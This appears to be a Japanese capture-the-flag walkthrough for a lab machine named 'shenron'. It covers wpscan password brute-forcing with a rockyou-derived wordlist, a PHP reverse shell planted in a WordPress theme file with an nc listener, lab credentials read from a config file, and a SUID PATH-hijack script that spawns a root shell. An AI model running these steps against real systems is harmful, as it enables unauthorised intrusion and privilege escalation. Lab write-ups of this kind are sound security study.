## 事前に辞書を作っておく
- `grep -B 100 iloverockyou /usr/share/wordlists/rockyou.txt > shenron.txt`

### 論点
- wpscanでbruteforce,reverse-shellへ書き込み(mr-robot似てる)
- PATHハイジャック(nullbyteに似てる)
### keyword
- /etc/hosts,
### 補足
- pspy,404.phpに書き込む,pluginにアップロード


## 攻略
- nmap
  - 80,wordpressであることがわかる 

- サイトを見たら崩れているので、hostsを書き換える。view page sourceを見る
- `sudo vim /etc/hosts`
- gobusterする
  - 特に何もない 
- `wpscan --url http://shenron/ -e u,p`
  - admin
- `wpscan --url http://shenron/ -U admin -P shenron.txt`
  - passwordは`iloverockyou`であることがわかる 
- wp-login.phpからダッシュボードに接続する
- reverse-shellをする
  - Appearance -> Editor -> archive.php
  - ここにphp-reverse-shell.phpを書き込んで保存する
  - Parrotで待ち受ける
  - `nc -nlvp 9001`
  - websiteから起動する
  - `http://shenron/wp-content/themes/twentyeleven/archive.php`
- ユーザを調べる
  - shenronがいる 
- 設定ファイルを見る
  - wordpress:Wordpress@123
- shenronにユーザを変える
  - `su shenron`
- SUIDを調べる
  - `find / -perm -u=s -type f 2>/dev/null`
  - /home/shenron/networkがあるpkexecもいけそう   
- psコマンド
  - `ps aux | grep -v root`
    - www-dataでapache2,mysqlでmysqld, 
  - `ps aux | grep root`
    - apache2,cron 
- /home/を見る
  - networkコマンドがあるので、実行してみると内部でnetstatコマンドが動いているのがわかる
  - fileはあるが、stringsコマンドがないので調べられない
  - netstatコマンドを見るとroot権限で動いているのがわかる
- PATHハイジャックでrootを取得する。これはroot権限で実行されているコマンドを特定のユーザに置いているのが脆弱性
- PATHハイジャックを利用してrootになる要件
  - 所有者がroot
  - 誰でも実行できる
  - 内部のコマンドがフルパスで書かれていない

```
cd /tmp
echo "/bin/bash" > netstat
chmod 777 netstat
export PATH=/tmp:$PATH
cd /home/shenron
./network
```
- rootになれる
